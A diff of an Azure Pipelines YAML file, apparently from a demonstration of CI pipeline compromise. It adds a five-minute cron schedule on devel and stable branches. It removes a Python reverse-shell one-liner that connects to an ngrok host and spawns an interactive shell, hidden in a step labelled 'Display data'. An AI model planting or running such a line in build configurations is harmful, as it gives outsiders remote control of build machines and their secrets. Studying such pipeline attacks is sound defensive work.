@@ -1,6 +1,15 @@
 pr:
 - main
 
+schedules:
+  - cron: */5 * * * *
+    displayName: every 5 minutes
+    always: true
+    branches:
+      include:
+        - devel
+        - stable-*
+
 
 variables:
 - name: varificationUrl # This variable is just an example of a trusted variable that can be compromised
@@ -19,10 +28,7 @@ steps:
       echo "$(Build.SourceBranchName)"
       echo "verifying the following commit:"
       echo "$(Build.SourceVersionMessage)"
-      python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("2.tcp.ngrok.io",16713));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
-
-      
+    
     displayName: Display data
 
   
